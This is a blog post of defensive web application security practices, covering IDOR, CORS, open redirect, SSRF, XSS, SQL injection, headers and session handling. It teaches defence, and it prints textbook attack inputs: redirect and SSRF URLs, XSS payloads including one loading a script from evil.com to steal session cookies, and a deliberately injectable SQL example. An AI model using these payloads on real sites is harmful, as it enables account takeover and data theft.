---
layout: post
title:  "Web Application Security Best Practices"
date:   2022-08-27 17:18:39 -0700
categories: web security
---

### Defending Against Business Information Leak via Unique Identifiers
For consumer-facing APIs, use UUID V4 to represent objects/resources instead of incremental DB IDs.
Incremental IDs reveal too much information about the business: how many orders have been
generated, how many users the system has, and so on.

Good: `https://api.example.com/order/c8cee55d-6793-4cad-a86f-db4f6a874f94`

Bad: `https://api.example.com/order/12`

Using UUIDs also makes IDOR attacks more difficult.

### Defending Against Indirect Object Reference (IDOR)
When accessing an object/resource, the backend should always ensure whether the current user can
access the requested object. As always, the input coming from the UI can never be trusted and should
always be validated. Having this check in a system prevents people from accessing information
that does not belong to them.

Sample requests accessing individual objects:

`https://api.example.com/order/c8cee55d-6793-4cad-a86f-db4f6a874f94`

`https://api.example.com/profile/bffb1565-817f-4118-b0f0-2fa23cc356c7`

### Defending Against Guessing Unique Identifiers
Prefer UUID V4 over UUID V1 to generate completely random UUIDs.
Do not roll your own UUID generator or random text generator.
Use battle-tested secure functions like those found in the standard or established libraries.

Node:[crypto.randomBytes(..)](https://nodejs.org/api/crypto.html#cryptorandombytessize-callback), 
     [crypto.randomUUID()](https://nodejs.org/api/crypto.html#cryptorandomuuidoptions),  
JVM: [new SecureRandom().nextBytes(..)](https://docs.oracle.com/en/java/javase/14/docs/api/java.base/java/security/SecureRandom.html),
     [UUID.randomUUID()](https://docs.oracle.com/en/java/javase/14/docs/api/java.base/java/util/UUID.html#randomUUID())  
Rust: [RngCore::fill_bytes](https://docs.rs/rand/0.8.5/rand/trait.RngCore.html#tymethod.fill_bytes),
      [Uuid::new_v4()](https://docs.rs/uuid/latest/uuid/struct.Uuid.html#method.new_v4)


### Defending Against Leaking Plain Text from CipherText
While encrypting data, when faced with a choice to pick a cipher mode, always prefer GCM and avoid 
weak ones such as [ECB](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)) 
and [CBC](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)).

The ECB mode encrypts each plaintext block in isolation without using an initialization vector or 
the previous encrypted block while encrypting the current block. Thus, the ECB mode always produces 
the same ciphertext each time the algorithm is run against the plaintext, leading to decipherable 
ciphertext by malicious actors who study the data. 

The CBC mode eliminates this problem by carrying information from the encryption or decryption of 
one block to the next. However, CBC is vulnerable to "padding oracle attacks"; 
the attacker can decrypt the data by altering ciphertext and find out whether the tampering caused 
an error in the padding format at the end.

[GCM](https://en.wikipedia.org/wiki/Galois/Counter_Mode), on the other hand, in addition to 
providing strong confidentiality protection without the security issues known to exist in ECB and 
CBC modes, also protects the integrity of the encrypted data by generating a message authentication 
code (MAC) as part of the encryption algorithm. If the encrypted data is attacked and altered, 
it will not match the MAC produced while encrypting the original plaintext.

### Defending Against Leaking Too Much Personally Identifiable Information(PII)
Do not stuff into a single API response all the information you can return about a user because some 
ORM framework makes it easy to do so. Addresses and phones should only be returned to the client in 
separate API calls such as `GET /address` and `GET /phone` only when needed, such as updating 
personal information.  Also, as a best practice, all endpoints that deal with PII should prevent 
browsers from caching sensitive data by returning the following header:

`Cache-control: no-store`

Returning as little PII as possible is a good practice because if a particular API is vulnerable to 
some exploitation, the amount of damage will be limited.
 
### Defending Against Tech Stack Information Leak
As much as possible, do not expose through API names and responses vendor or technology names, 
versions of backend servers, the kind of databases used, the patterns used, the 3rd party 
integrations in place, staging configurations, and data from test files. 
The more information attackers gather about a system, the easier it becomes for them to 
deploy exploits. Furthermore, do not expose Swagger API documentation of REST services in production. 
If you are building a GraphQL service, disable endpoint introspection. 
Avoid leaking stack traces via API responses in production.

### Defending Against Cross-site Request Forgery(CSRF)
CSRF exploits the trust a website has in its users. Thanks to modern browsers implementing the 
[Same-Origin Policy(SOP)](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy), 
a site practicing good security should not be vulnerable to this attack. 
This type of attack focuses on users. This attack is easy to execute, does not 
involve breaking into a system, and does not require a lot of technical skills. 
Usually, this is done by luring the victim to a 3rd party website as part of a phishing campaign. 
The malicious site might pretend to be an affiliate of the target site. 
As the victim performs actions on the malicious site, they are unaware that all the requests are 
going to the servers of the legitimate site. For instance, the victim may think they are logging 
into `shopping.site.com`, but the malicious site they are making an HTTP request from could be 
`shopping.site2.com`. During the attack, the user's credentials can be stolen, and the state of their 
account could go through changes unknown to them. The attack could also come from a victim randomly 
clicking a link while being authenticated to the target website.

As per SOP, making XHR requests from one domain to another is impossible. To relax this restriction, 
services enable [Cross-Origin Request Sharing(CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). 
For instance, to be able to make requests to `api.example.com` from `https://www.example.com`, 
CORS needs to be enabled on the server-side. CORS relies on headers to determine whether a 
destructive request(PUT, POST, PATCH, DELETE) should be processed using 
[preflighting](https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request). 
GET requests are not preflighted, meaning they always 
execute on the server-side even if the browser refuses to show the response due to SOP. 
Due to this phenomenon, destructive actions should never occur in GET requests. 
Misconfiguration of CORS can lead to a website accepting requests from a malicious site. 
If the server reflects in `Access-Control-Allow-Origin` response header whatever is in the `Origin` 
request header without consulting an allowlist, the website would be accessible to cross-site 
requests from 3rd party sites. A rogue website such as `greatexample.com` could lure the company's
customers away and start making requests to `https://www.example.com`. Having an allowlist instead of 
just doing regex matching against the domain is also crucial. If the website were to end up with a 
dangling CNAME(alias) entry(e.g., `foo.example.com`), this subdomain could be registered by a 
malicious actor and start making requests to api.example.com. However, if the server hosting 
`api.example.com` always consulted an allowlist to accept requests only from `my.example.com` and 
`www.example.com`, cross-site requests from malicious websites would fail. Combining proper CORS settings 
with the [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) 
cookie attribute eliminates all XHR-based CSRF attacks. Also, APIs that accept the 
content type `application/json` should not have to worry about accepting an anti-CSRF token.

### Defending Against Open Redirect Attacks
Open redirect attacks exploit redirection occurring on a trusted website so that after clicking a link,
the victim ends up on a malicious site used for phishing or malware delivery purposes instead of a page
on the same website or another trusted site. A simple, legitimate redirection usually looks like the 
following: 

`https://www.example.com/redirect?url=https://www.example.com/dashboard`

Exploiting this vulnerability requires a web application to accept a parameter prone to manipulation.
With these kinds of attacks, the legitimate customers of a website could be lured away and their 
PII could be stolen. A simple, malicious open redirection attack could look like 
`https://www.example.com/redirect?url=http://www.example2.com/dashboard`. These types of attacks 
usually rely on [typosquating](https://en.wikipedia.org/wiki/Typosquatting). Also, through these 
endpoints, the website's servers could be used as a proxy to participate in DDoS attacks against 
other services on the Internet.

Despite being deemed a low priority by bug bounty programs, open redirect attacks vulnerabilities 
should be considered a high priority. Some of the attacks that occurred in the past leveraging this vulnerability:

<https://www.trendmicro.com/en_us/research/19/e/trickbot-watch-arrival-via-redirection-url-in-spam>
<https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781>  

Sophisticated open redirect attacks in the real world look like the following links that use clever 
URL-encoding tricks:

`https://www.example.com/redirect?url=https%3A%2F%2Fwww.google.com%2F`

`https://www.example.com/redirect?url=https://www%2Egoogle%2Ecom`

`https://www.example.com/redirect?url=https://www%252Egoogle%252Ecom`

`https://www.example.com/redirecturl=http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D`

How to prevent Open Redirect Attacks:

- If possible, remove the redirection endpoints from the application, and replace them with direct 
links to the target URLs.

- Maintain a list of all valid URLs for redirection on the backend. Instead of passing the target URL as a 
  parameter to the redirect page, restrict the parameter to accept a fixed set of values such as 
  “dashboard” and “home”. The backend should look up the parameter value by 
  consulting its allowlist and return a redirect to the relevant URL. 
  Examples: `https://www.example.com/redirect?page=dashboard`, `https://www.example.com/redirect?page=home`, etc.

- If it is unavoidable for the redirection endpoint to receive a URL, the endpoint should receive 
absolute URLs for all redirects, and the backend should verify that the URL is in the allowlist.

- Never use regular expressions to validate redirection parameter values, as they are highly likely to be 
  defeated by some clever fuzzing technique.
  
### Defending Against Server-side Redirect Attacks (aka, SSRF)
Server-side redirection vulnerabilities are similar to open redirection vulnerabilities, except the 
HTTP request is fired on the server-side instead of on the client-side. 
The malicious actors might exploit the application by performing the following actions:

- Return information from the localhost

- Use the service as a proxy to make requests to 3rd party services on the Internet 

- Make requests to other services in the organization’s internal network that they otherwise would 
not be able to access

- Induce the server to return a malicious script to escalate to an XSS attack

- Download a malicious payload from a link to get a foothold on the server via code 
injection(e.g., [Log4Shell](https://learn.snyk.io/lessons/log4shell/java/)). 

- The best way to prevent this attack is to do strict input validation and consult an allowlist when 
the input is passed to the service’s endpoint to make an HTTP call to another service. The attack 
prevention methods of Open Redirect are also applicable to this type of attack.

Simple SSRF attacks in the real world look like the following links:

`https://www.example.com/page?url=http://127.0.0.1/admin`

`https://www.example.com/page?url=http://api.internal.service/`

`https://www.example.com/page?url=sftp://internal.sftp.server:22/`

`https://www.example.com/page?url=https://www.google.com/`
  
### Defending Against Supply Chain Attacks
Ensure project libraries are scanned against vulnerabilities using a tool such as 
[Synk](https://snyk.io/). Pin down versions of not established open source libraries so that the systems do 
not get injected with malicious code as part of deploying a PR to production.

### Defending Against Leaking Sensitive Information via Logs
- Do not put PII, auth tokens, and other sensitive data in URL paths and parameters; 
these can leak to 3rd party integrations on the UI-side through the Referrer header and be recorded 
in internal access logs.
- Make sure backend validation error messages do not contain user input. 
- Build a wrapper logging library to take advantage of automated business-specific PII filtering so that
  your production search indices are free of PII.
  
### Defending Against Cross-Site-Scripting (XSS)
There are three types of XSS attacks: stored, reflected, and DOM-based. XSS is about getting 
some malicious JS code to run in the victim’s browser while they visit the target site. 
It exploits the trust a user has in the website. Just like CSRF, it does not require breaking into a server.
However, XSS can do relatively more damage to a site.

#### Reflected XSS
Reflected XSS involves injecting malicious executable code into an HTTP response. 
The victim’s browser executes the attack only if the user opens a link set up by the attacker. 
Named reflected XSS because exploiting the vulnerability involves crafting a request containing 
embedded JavaScript reflected to any user who makes the request. The malicious script does not 
reside in the application and does not persist. The malicious URL can contain an attack string that
the application processes improperly and puts into the response, which eventually gets executed
in the user’s browser. The attack payload is delivered and executed via a single request and response. 
This type of XSS bug accounts for about 75% of the XSS vulnerabilities that exist in real-world web 
applications.

An attacker discovers a link that takes a parameter like so:  
`https://example.com?query=latest&news`

The attacker tries the following string in the query parameter:

{% highlight html %}
<script type=’text/javascript’>alert(‘test’);</script>
{% endhighlight %}

If the website does not properly sanitize inputs, this test script will appear in the URI like so:

{% highlight html %}
https://example.com?query=<script type=’text/javascript’>alert(‘test’);</script>
{% endhighlight %}

And the script will execute, showing an alert box in the browser. This means the website is 
vulnerable to an XSS attack.

Now the attacker can craft a URL that executes a malicious script from their own domain:

{% highlight html %}
https://example.com?query=latest&news<\script%20src=”https://evil.com/malicious.js”
{% endhighlight %}

The attacker embeds this link into a phishing email and sends it to individuals who are users of the
target site and are likely to be logged into it. Some users might be hesitant to click on a link 
from an unknown sender, but it is enough that only a few are tricked into clicking.
Any user who clicks the link will cause the malicious script to execute. Typically, the script will 
contain code that steals the session cookie and allows the attacker to take over those users' accounts.
Reflected XSS can have more impact on Single Page Applications(SPAs), where the injected malicious 
script has a chance to linger longer due to the application not causing the browser to reload the entire DOM.

#### DOM-based XSS
DOM-based XSS is an attack where the attack payload gets executed as a result of modifying the DOM 
by exploiting client-side code (e.g., Snippet 1) that makes a decision using query or path parameters 
from the current page’s URL. That is, the HTTP response is not modified, unlike in stored and 
reflected XSS attacks, but the client-side code contained in the page executes differently due to 
the malicious code injection that occurred in the DOM. The attack usually starts with the victim 
requesting a crafted URL supplied by the attacker containing some embedded JavaScript.

```javascript
// Snippet 1: Front-end code making a decision using document.location
const url = document.location;
const message = url.substring(url.indexOf('message=') + 8, url.length)
document.write(message); // React equivalent: "dangerouslySetInnerHTML={{__html: message}}"
```
  
This script parses the URL to extract the value of the message parameter and writes this value into 
the page’s HTML source code. However, if an attacker crafts a URL containing JavaScript code as the 
value of the message parameter, this code will be dynamically written into the page and executed the
same way as if the server had returned it. Usually, this XSS occurs when an application employs a 
dynamic page to display error messages to users. Typically, the page takes a parameter containing 
the message’s text and renders this text back to the user within its response.

URL with malicious payload:   
`https://example.com/error?message=<script>alert('xss')</script>`
 
DOM APIs that access the current or the referring URL:
```javascript
document.location
document.URL
document.referrer
window.location
```
 
#### Stored XSS
A stored/persistent XSS vulnerability arises when data submitted by an attacker is stored in the 
application’s database via a destructive HTTP request such as POST or PUT and then displayed to 
other users without being sanitized.

Web applications that support interaction between end users or allow an administrator to access 
user records within the same site are where this type of attack shines. For example, consider a 
website where users post questions and reviews about specific items. If a user can post a question 
containing embedded JavaScript and the application does not filter or sanitize this, an attacker 
can post a crafted question that causes arbitrary scripts to execute within the browser of anyone 
who views the question. 

Unlike its reflected cousin, stored XSS does not need to induce victims to visit a crafted URL and 
convince users to log in or enter information. Once the malicious payload gets delivered to the site, 
the attacker waits for victims to access the compromised page or function of their own accord. 
Thus, stored XSS is considered more critical than other types of XSS.

On a side note, the files uploaded to a website can also provide opportunities for XSS exploitation:

- if the name of the file is not validated and output on the UI without any sanitization

- if the metadata of the file contains malicious code that the UI dangerously writes to the DOM 
 
 
DOM APIs vulnerable to XSS:
```javascript
document.location
document.URL
document.referrer
window.location
``` 


#### Preventing XSS
**Store session IDs in `HttpOnly` cookies**: Storing session IDs in localStorage is not recommended 
because a malicious script will always have access to `localStorage`. It is best to store session IDs 
in HTTPOnly cookies to ensure the front-end code cannot access them. Cookies can only be used in 
domains they are intended for, which is determined by the `domain` attribute. 
HttpOnly cookies will only be included in XHR requests that hit the domain mentioned in the Domain attribute. 
To enable sending of cookies in XHR requests, one has to set the `withCredentails` flag. 
In short, HttpOnly cookies prevent stealing of session IDs and mitigate the amount of damage an attacker 
could do.

**Validate input**: Each parameter and field must be typed and validated using a validation framework 
to enforce business constraints. On top of that, a middleware filter such as XSS should be installed 
in each consumer-facing service, as shown in Snippet 2. Even though WAFs offer XSS protections, 
it does not hurt to practice defense in depth as it has been demonstrated that there are tricky payloads 
that can circumvent WAFs.

```javascript
// Snippet 2: Middleware JS/HTML filter

const xss = require('xss');
const boom = require('boom');

const onPreHandler = function(request, h) {
    if (request.payload &&  request.payload.query) {
      const payloadWhiteSpaceRemoved = request.payload.query.replace(/\s/g, '');
      const payloadSanitized = xss(payloadWhiteSpaceRemoved);
      if (payloadWhiteSpaceRemoved !== payloadSanitized) {
        throw boom.badRequest('Request failed XSS guard test');
      }       
    }
    return h.continue;
}

module.exports = {
  name: 'xss',
  version: '1.0.0',
  register: async (server, options) => {
    server.ext('onPreHandler', onPreHandler)
  } 
}
```

Similar filters exist for other languages such as [ammonia](https://crates.io/crates/ammonia) and
[Encoder](https://owasp.org/www-project-java-encoder).

**Sanitize output**: React automatically escapes(e.g., Figure 11) variables used in views, 
which prevents XSS. However, React also has some rough edges developers need to pay attention to:

- `dangerouslySetInnerHTML` will execute code as is. Avoid it, if possible. If not, sanitize the 
data using [DomPurify](https://github.com/cure53/DOMPurify)(e.g., Figure 16.)

- As shown in figures 13 and 14, React will execute javascript: or data: URLs if put in attributes 
such as href, src, or style. If you have to enter user input into these attributes, sanitize with 
DomPurify before doing so.

```jsx
const username = "<img onerror='alert(\"Pawned!\")' src='invalid-image'/>"
class ProfilePage extends React.Component {
  render() {
    return (<h1> Hello {username}!</h1>);  
  }
}

```

```jsx
const userAboutText = "<img onerror='alert(\"Pwned!\")' src='invalid-image'/>"
class AboutUserPage extends React.Component {
  render() {
    return (<div dangerouslySetInnerHTML={{"__html":  userAboutText}} />);  
  }
}

```

```jsx
const username = "javascript:alert('Pwned');"
class ProfilePage extends React.Component {
  render() {
    return (<a href={username}> Profile</a>);  
  }
}
```

### Mitigating XSS Using Content Security Policy ([CSP](https://content-security-policy.com/))
CSP as the last line of defense can help mitigate XSS. If all else fails, one can rely on CSP to mitigate 
XSS by restricting what an attacker can do. CSP allows a site to control whether external scripts 
can be loaded and inline scripts will be executed. To deploy CSP, one needs to include an HTTP 
response header called `Content-Security-Policy` with a value containing the site's policy.

An example CSP is as follows:

`default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; base-uri 'self';`

The above policy specifies that resources such as images, style sheets, and scripts can only be loaded 
from the same origin as the main page and inline scripts cannot be executed. XHR requests can only 
originate from the main page. It prevents the loading of frames and objects. So, even if an attacker 
injects an XSS payload, they won’t be able to load resources from a 3rd party origin, limiting 
the amount of damage that can be done using advanced exploitation tools such as [BeEF](https://youtu.be/PPzn4K2ZjfY). 

All of the above prevention methods are effective against `HTML injection` as well.  

### Defending Against SQL Injection
All parameters coming from the client should not be directly embedded in the query. Instead, 
they should be parametrized(become a prepared statement) using the persistence library’s APIs 
as shown in Figure 17.
```javascript
const product = httpRequest.getParameter("product");
const store = httpRequest.getParameter("store");

// BAD
const query = `select * from inventory inv where inv.store = ${store} and inv.product = ${product}`;
const results = await db.exec(query);

// GOOD
const query = `select * from inventory inv where inv.store = ? and inv.product = ?`;
const results = await db.execWithParam(query, store, product);

```

### Enforcing Business Rules
The frontend alone cannot be relied upon to enforce business rules. The backend should never trust
what's coming from the user and do the necessary validation and execute the necessary logic 
to enforce business rules.

### API Rate-limiting
Since GraphQL houses all operations under a single endpoint, individual operations are not rate-limitable 
by Cloudflare WAF. REST APIs should be preferred over GraphQL where individual rate-limiting of
operations is important.

### Firewall API Protection
To avail of Cloudflare's request challenge feature, a legitimate request should be sending 
the `cf_clerance` cookie in the request header. When dealing with cross-site requests, 
to achieve this, the front-end code should 
set the `withCredentials` flag in all requests and the backend should return the CORS header 
`Access-Control-Allow-Credentials` in all responses. Being able to clear the challenges on the 
browser side will help the site serve legitimate customers even in adverse conditions. 
For more information on this topic, see [Cloudflare challenges](
https://developers.cloudflare.com/fundamentals/get-started/concepts/cloudflare-challenges/).
  
### Storing Data on the Frontend
Do not store any PII or sensitive tokens in localStorage. Think of localStorage as a
persistent data store that will retain data until the code deletes it or the user clears the 
browser’s cache.  Data such as user preferences that shape the visual experience could be stored in 
localStorage to offer unique experience for each customer. If you need to store some PII that 
is frequently referred to on multiple pages such as the user's first name, store it in sessionStorage,
which is cleared when the user closes the browser’s tab.

### Additional Security Headers

#### HTTP Strict Transport Security (HSTS)
A man-in-the-middle(MiTM) attack can occur even if a link on the website is accessible over HTTP.
To prevent this from happening, the server needs to return the Strict-Transport-Security header (HSTS)
in all responses. The Strict-Transport-Security header forces the browser to communicate with HTTPS instead of 
HTTP. Strictly using HTTPS can prevent most man-in-the-middle and session hijacking attacks.
The returned header should look like so: 
`Strict-Transport-Security: max-age=31536000; includeSubDomains`
The header forces the browser to remember to always talk to the site over the HTTPs protocol.

To ensure even the first visit by a browser to a site is not vulnerable to MiTM, the site has to be
added to the HSTS preload list. In this case, the returned header needs to look like so:

`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`.

#### X-XSS-Protection
This header used to be supported by browsers to provide protection against XSS, but later was
found to be harmful and facilitating XSS attacks. Thus, the current practice is to turn off this
header on the server side.

`X-XSS-Protection: 0`


#### X-Frame-Options
This response header can be used to indicate whether or not a browser should 
be allowed to render a page in a <frame>, <iframe>, <embed> or <object>. Given that it's very rare 
that a website needs to be embedded in a frame and to avoid click-jacking attacks,   
the current best practice is to disallow this feature.
 
`X-Frame-Options: DENY`

Also, note that the Content-Security-Policy HTTP header has a `frame-ancestors` directive that 
obsoletes this header for supporting browsers.

#### X-Content-Type-Options
This response header prevents MIME-sniffing. MIME-sniffing occurs browsers try to 
determine the document’s file type by examining its content and disregarding the server’s 
instructions set in the Content-Type header.

MIME-sniffing is a useful feature but can lead to vulnerabilities. 
For example, an attacker can upload a JavaScript file with the extension of an image file. 
When others try to view the image, their browsers detect that the file is a JavaScript file and 
execute it instead of rendering it as an image. The recommendation is to turn off this and force
the browsers to rely on the `Content-type` header

`X-Content-Type-Options: nosniff`

#### Referrer-Policy
This response header tells the browser when to send Referrer information. 
A strict referrer-policy can prevent customer information leakages via Referrer URLs. 
`strict-origin-when-cross-origin` is deemed to be a good protective policy as it only shares the
origin when making a cross-origin request. For more information on this header, 
check out [web.dev](https://web.dev/referrer-best-practices/#example-element-level-policy) 

### Cookie Attributes
 
#### Secure
This attribute ensures that cookies are transported only over HTTPS. It's a no brainer to set this
to `true` always. 

#### SameSite
This attribute determines whether site cookies should be available to a request coming from 3rd party 
websites. The `Strict` value prevents inclusion of cookies in requests coming from 3rd party websites
and `Lax` only allows cookies in GET(non-destructive) requests. Starting with the most restrict
option is a good idea to have a robust protection against CSRF.
 
#### Path
If a cookie needs to be available only under a certain path, enforce that 
explicitly by setting the right scope.
 
### Cookie Prefixes
Inherently cookies do not have the capabilities to guarantee the integrity and confidentiality of 
the information stored in them. To give servers confidence about how a given cookie’s attributes 
were set at creation, the concept of cookie prefixes were introduced. 

Both the `__Host-` and `__Secure-` prefixes require cookies to be set:
 - with the Secure attribute.
 - from a URI considered secure by the user agent.
 
Host prefix additionally requires cookie: 
 - is only sent to host who set the cookie and MUST NOT include any Domain attribute.
 - must be set with the `Path` attribute with a value of / so it would be sent in every request to 
 the host 
 
 
### Session ID
A `session_id` should be generated using established functions such as 
[crypto.randomBytes(..)](https://nodejs.org/api/crypto.html#cryptorandombytessize-callback) 
and base64'ed before returning it to the client. SHA256-hashed or salt-hashed version of session_id 
should be stored in DB to prevent session stealing in case the attacker somehow gets DB access and steals 
active session IDs. When the `session_id` is presented to the API, it should be SHA256-hashed or 
salt-hashed before a token look-up happens in DB.

`session_id` should not be included in the logs in order to protect sessions against potential hijacking 
that can occur due to data theft in the cloud environment. 
Instead, the hashed version of `session_id` should be included in the logs in order to allow for 
session-specific log correlation.

To mitigate DDoS attacks, session_id should be HMAC-SHA256 signed to avoid making unnecessary DB 
calls while validating its integrity(The "Is this issued by my site?" test).

### Password Storage 
Hashed form of passwords should be stored with a strong one-way hashing algorithm such as
[Argon2](https://en.wikipedia.org/wiki/Argon2).


### Zero Trust Microservice Architecture
Microservices should not be able to talk to each other without some form of verification.
One way to do is to use [mTLS](https://www.cloudflare.com/learning/access-management/what-is-mutual-tls/) 
certificates. In addition to mTLS handshakes, one can also use JWTs to carry context between services.
 
### Storing and Accessing Application Secrets
Application secrets should be stored in a service such as [Vault](https://www.vaultproject.io/).
Reading secrets into environment variables should be avoided at all costs: this approach
makes secrets easily available to anyone who accesses the box. It is a lot safer to read secrets
into application's own memory.


### Monitoring DNS Entries
The organization should have an automated tool to monitor DNS entries of an organization to 
prevent [subdomain takeovers](
https://developer.mozilla.org/en-US/docs/Web/Security/Subdomain_takeovers). 
Ideally, this tool should query a DNS service such as Route53 with internal access directly and check to 
see if there are dangling entries.
 
### Using an API Gateway 
In the age of microservices, organizations should consider having
an API gateway behind which services live. This helps with management of an attack surface of an
organizations as well as maintainability. If individual services are directly exposed to the outside
world, then you might find yourself in a situation where you have to make similar security changes
in multiple services instead of one place.

### Invest in Anomaly Detection
To catch bad actors quickly if your services are breached, the organizations should
invest in anomaly detection systems that can alert them quickly to strange activities.